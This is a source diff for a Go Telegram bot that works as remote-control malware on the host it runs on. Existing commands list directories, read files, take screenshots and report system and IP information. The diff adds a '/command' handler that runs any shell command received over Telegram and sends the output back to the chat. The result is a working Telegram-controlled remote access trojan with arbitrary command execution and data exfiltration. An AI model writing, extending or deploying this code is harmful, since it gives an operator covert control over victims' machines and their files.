@@ -55,14 +55,16 @@ func main() {
 	dispatcher.AddHandler(handlers.NewCommand("ping", pingPong))
 	// Get basic host info
 	dispatcher.AddHandler(handlers.NewCommand("systeminfo", systemInfo))
+	//Get public IP address
+	dispatcher.AddHandler(handlers.NewCommand("ip", getIPs))
 	//List files/directories
 	dispatcher.AddHandler(handlers.NewCommand("list", listFiles))
 	//Read file
 	dispatcher.AddHandler(handlers.NewCommand("file", readFile))
 	//Take screenshot
 	dispatcher.AddHandler(handlers.NewCommand("screenshot", takeScreenshot))
-	//Get public IP address
-	dispatcher.AddHandler(handlers.NewCommand("ip", getIPs))
+	//command
+	dispatcher.AddHandler(handlers.NewCommand("command", executeCommand))
 
 	//Start polling for updates
 	err = updater.StartPolling(b, &ext.PollingOpts{
@@ -87,7 +89,7 @@ func main() {
 func getHelp(b *gotgbot.Bot, ctx *ext.Context) error {
 
 	//Array contains the available commands
-	commands := []string{"/ping", "/systeminfo","/list <dir>", "/file <file>", "/screenshot", "/ip"}
+	commands := []string{"/ping", "/systeminfo", "/ip", "/list <dir>", "/file <file>", "/screenshot", "/command"}
 
 	//Reply with list of available commands
 	_, err := b.SendMessage(ctx.EffectiveChat.Id, strings.Join([]string(commands), "\n"), &gotgbot.SendMessageOpts{
@@ -147,14 +149,13 @@ func listFiles(b *gotgbot.Bot, ctx *ext.Context) error {
 	//Extract the filename from the message (e.g. C:\Users\)
 	dirName, err := helpers.ExtractArgument(messageText)
 	if err != nil {
-
 		//If no argument provided send intructions
-		_, err = b.SendMessage(ctx.EffectiveChat.Id, "Usage: <b>/list</b> &lt;dir_path&gt;", &gotgbot.SendMessageOpts{
+		_, err2 := b.SendMessage(ctx.EffectiveChat.Id, "Usage: <b>/list</b> &lt;dir_path&gt;", &gotgbot.SendMessageOpts{
 			ParseMode: "html",
 			//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
 		})
-		if err != nil {
-			return fmt.Errorf("Failed to send message: %w", err)
+		if err2 != nil {
+			return fmt.Errorf("Failed to send instructions: %w", err2)
 		}
 
 		return fmt.Errorf("Failed to parse command: %w", err)
@@ -194,12 +195,12 @@ func readFile(b *gotgbot.Bot, ctx *ext.Context) error {
 	fileName, err := helpers.ExtractArgument(messageText)
 	if err != nil {
 		//If no argument provided send intructions
-		_, err = b.SendMessage(ctx.EffectiveChat.Id, "Usage: <b>/file</b> &lt;filen_path&gt;", &gotgbot.SendMessageOpts{
+		_, err2 := b.SendMessage(ctx.EffectiveChat.Id, "Usage: <b>/file</b> &lt;filen_path&gt;", &gotgbot.SendMessageOpts{
 			ParseMode: "html",
 			//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
 		})
-		if err != nil {
-			return fmt.Errorf("Failed to send message: %w", err)
+		if err2 != nil {
+			return fmt.Errorf("Failed to send instructions: %w", err2)
 		}
 
 		return fmt.Errorf("Failed to parse command: %w", err)
@@ -299,6 +300,48 @@ func getIPs(b *gotgbot.Bot, ctx *ext.Context) error {
 	})
 	if err != nil {
 		return fmt.Errorf("Failed to send IP addresses: %w", err)
+	}
+
+	return nil
+}
+
+func executeCommand(b *gotgbot.Bot, ctx *ext.Context) error {
+
+	//Read the effective message text (e.g. /commmand whoami)
+	messageText := ctx.EffectiveMessage.Text
+
+	//Extract the filename from the message (e.g. whoami)
+	cmd, err := helpers.ExtractArgument(messageText)
+	if err != nil {
+
+		//If no argument provided send intructions
+		_, err = b.SendMessage(ctx.EffectiveChat.Id, "<i>Usage:</i> /command &lt;system_command&gt;", &gotgbot.SendMessageOpts{
+			ParseMode: "html",
+			//ReplyToMessageId: ctx.EffectiveMessage.MessageId,
+		})
+		if err != nil {
+			return fmt.Errorf("Failed to send instructions: %w", err)
+		}
+
+		return fmt.Errorf("Failed to parse command: %w", err)
+	}
+
+	//Execute the system command
+	output, err := helpers.ExecuteSystemCommand(cmd)
+	if err != nil {
+		//If an error occured during the commad execution send it to Telegram server
+		_, err2 := b.SendMessage(ctx.EffectiveChat.Id, err.Error(), &gotgbot.SendMessageOpts{})
+		if err2 != nil {
+			return fmt.Errorf("Failed to send command execution error: %w", err2)
+		}
+
+		return fmt.Errorf("Failed to execute the command: %w", err)
+	}
+
+	//Send the output to Telegram server
+	_, err = b.SendMessage(ctx.EffectiveChat.Id, string(output), &gotgbot.SendMessageOpts{})
+	if err != nil {
+		return fmt.Errorf("Failed to send command output: %w", err)
 	}
 
 	return nil
